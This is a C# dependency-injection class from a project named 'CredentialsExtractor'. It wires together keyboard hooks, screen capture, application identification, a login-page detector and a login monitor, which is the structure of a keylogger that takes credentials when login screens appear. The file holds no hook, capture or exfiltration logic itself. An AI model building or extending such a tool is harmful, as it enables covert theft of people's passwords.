using CredentialsExtractor.Configuration;
using CredentialsExtractor.Core;
using CredentialsExtractor.Input;
using CredentialsExtractor.Logging;
using CredentialsExtractor.Cryptography;

namespace CredentialsExtractor.DependencyInjection
{
    public class ServiceProvider
    {
        private readonly Dictionary<Type, object> _services = new Dictionary<Type, object>();

        public ServiceProvider(IAppConfig config, ILogger logger)
        {
            // Register core services
            RegisterService<ILogger>(logger);
            RegisterService<IAppConfig>(config);

            // Register cryptography service
            RegisterService<ICryptographyService>(CryptographyServiceFactory.CreateDefault());

            // Register input services
            RegisterService<IKeyboardHookFactory>(new KeyboardHookFactory());
            RegisterService<IKeyboardUtils>(new KeyboardUtils());
            RegisterService<IKeyboardManager>(new KeyboardManager(
                GetService<IKeyboardHookFactory>(),
                GetService<IKeyboardUtils>(),
                GetService<ILogger>()));

            // Register app identification service
            RegisterService<IApplicationIdentifier>(new Win32ApplicationIdentifier(GetService<ILogger>()));

            // Register capture and detection services
            RegisterService<IScreenCapture>(new ScreenCapture(config, GetService<ILogger>()));

            // Use DllLoginDetector with keyboard manager, application identifier, and cryptography service
            RegisterService<ILoginPageDetector>(new DllLoginDetector(
                config,
                GetService<ILogger>(),
                GetService<IKeyboardManager>(),
                GetService<IApplicationIdentifier>(),
                GetService<ICryptographyService>(), // Add cryptography service
                0.6));

            // Register monitor
            RegisterService<ILoginMonitor>(new LoginMonitor(
                GetService<IAppConfig>(),
                GetService<IScreenCapture>(),
                GetService<ILoginPageDetector>(),
                GetService<IKeyboardManager>(),
                GetService<ILogger>()));
        }

        public void RegisterService<T>(object implementation)
        {
            _services[typeof(T)] = implementation;
        }

        public T GetService<T>()
        {
            if (_services.TryGetValue(typeof(T), out object service))
            {
                return (T)service;
            }

            throw new InvalidOperationException($"Service of type {typeof(T).Name} is not registered.");
        }
    }
}